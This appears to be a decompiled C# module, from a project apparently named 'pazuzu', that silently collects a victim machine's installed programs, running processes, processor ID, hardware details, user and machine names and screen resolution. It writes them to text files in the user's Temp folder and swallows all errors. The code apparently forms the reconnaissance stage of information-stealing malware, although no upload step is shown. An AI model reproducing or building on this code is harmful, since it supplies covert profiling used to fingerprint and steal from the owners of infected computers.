using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Management;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace pazuzu.Required;

internal class Systemsinfo
{
	private static string userName = Environment.UserName;

	public static void ProgProc()
	{
		using (StreamWriter streamWriter = new StreamWriter("C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\Programms.txt", append: false, Encoding.Default))
		{
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
				string[] subKeyNames = registryKey.GetSubKeyNames();
				for (int i = 0; i < subKeyNames.Length; i++)
				{
					RegistryKey registryKey2 = registryKey.OpenSubKey(subKeyNames[i]);
					if (registryKey2.GetValue("DisplayName") is string value)
					{
						streamWriter.WriteLine(value);
					}
				}
			}
			catch
			{
			}
		}
		try
		{
			using StreamWriter streamWriter2 = new StreamWriter("C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\Processes.txt", append: false, Encoding.Default);
			Process[] processes = Process.GetProcesses();
			for (int j = 0; j < processes.Length; j++)
			{
				streamWriter2.WriteLine(processes[j].ProcessName.ToString());
			}
		}
		catch
		{
		}
	}

	public static string GpuName()
	{
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Expected O, but got Unknown
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Expected O, but got Unknown
		try
		{
			string text = string.Empty;
			string text2 = "SELECT * FROM Win32_VideoController";
			ManagementObjectSearcher val = new ManagementObjectSearcher(text2);
			try
			{
				ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						ManagementObject val2 = (ManagementObject)enumerator.get_Current();
						text = text + ((ManagementBaseObject)val2).get_Item("Description").ToString() + " ";
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
			return (!string.IsNullOrEmpty(text)) ? text : "N/A";
		}
		catch
		{
			return "Unknown";
		}
	}

	public static string GetPhysicalMemory()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			ManagementScope val = new ManagementScope();
			ObjectQuery val2 = new ObjectQuery("SELECT Capacity FROM Win32_PhysicalMemory");
			ManagementObjectCollection val3 = new ManagementObjectSearcher(val, val2).Get();
			long num = 0L;
			ManagementObjectEnumerator enumerator = val3.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementBaseObject current = enumerator.get_Current();
					long num2 = Convert.ToInt64(((ManagementBaseObject)(ManagementObject)current).get_Item("Capacity"));
					num += num2;
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return (num / 1024L / 1024L).ToString();
		}
		catch
		{
			return "Unknown";
		}
	}

	public static string ProcessorId()
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			ManagementObjectCollection instances = new ManagementClass("SELECT * FROM Win32_Processor").GetInstances();
			string result = string.Empty;
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementBaseObject current = enumerator.get_Current();
					result = (string)((ManagementBaseObject)(ManagementObject)current).get_Item("ProcessorId");
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return result;
		}
		catch
		{
			return "Unknown";
		}
	}

	public static string GetOSInformation()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem").Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementBaseObject current = enumerator.get_Current();
				ManagementObject val = (ManagementObject)current;
				try
				{
					return ((string)((ManagementBaseObject)val).get_Item("Caption")).Trim() + ", " + (string)((ManagementBaseObject)val).get_Item("Version") + ", " + (string)((ManagementBaseObject)val).get_Item("OSArchitecture");
				}
				catch
				{
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		return "BIOS Maker: Unknown";
	}

	public static string GetComputerName()
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			ManagementObjectCollection instances = new ManagementClass("Win32_ComputerSystem").GetInstances();
			string result = string.Empty;
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementBaseObject current = enumerator.get_Current();
					result = (string)((ManagementBaseObject)(ManagementObject)current).get_Item("Name");
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return result;
		}
		catch
		{
			return "Unknown";
		}
	}

	public static string GetProcessorName()
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			ManagementObjectCollection instances = new ManagementClass("Win32_Processor").GetInstances();
			string result = string.Empty;
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementBaseObject current = enumerator.get_Current();
					result = (string)((ManagementBaseObject)(ManagementObject)current).get_Item("Name");
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return result;
		}
		catch
		{
			return "Unknown";
		}
	}

	public static void PcInfo()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		ComputerInfo val = new ComputerInfo();
		Size size = Screen.get_PrimaryScreen().get_Bounds().Size;
		try
		{
			using StreamWriter streamWriter = new StreamWriter("C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\Info.txt", append: false, Encoding.Default);
			string[] obj = new string[26]
			{
				"OC verison - ",
				Environment.OSVersion?.ToString(),
				" | ",
				val.get_OSFullName(),
				"\nMachineName - ",
				Environment.MachineName,
				"/",
				Environment.UserName,
				"\nResolution - ",
				null,
				null,
				null,
				null,
				null,
				null,
				null,
				null,
				null,
				null,
				null,
				null,
				null,
				null,
				null,
				null,
				null
			};
			Size size2 = size;
			obj[9] = size2.ToString();
			obj[10] = "\nCurrent time Utc - ";
			obj[11] = DateTime.UtcNow.ToString();
			obj[12] = "\nCurrent time - ";
			obj[13] = DateTime.Now.ToString();
			obj[14] = "\nCPU - ";
			obj[15] = GetProcessorName();
			obj[16] = "\nRAM - ";
			obj[17] = GetPhysicalMemory();
			obj[18] = "\nGPU - ";
			obj[19] = GpuName();
			obj[20] = "\nProcessorID - ";
			obj[21] = ProcessorId();
			obj[22] = "\nOSInfo - ";
			obj[23] = GetOSInformation();
			obj[24] = "\nComputer Name - ";
			obj[25] = GetComputerName();
			streamWriter.WriteLine(string.Concat(obj));
			streamWriter.Close();
		}
		catch
		{
		}
	}
}
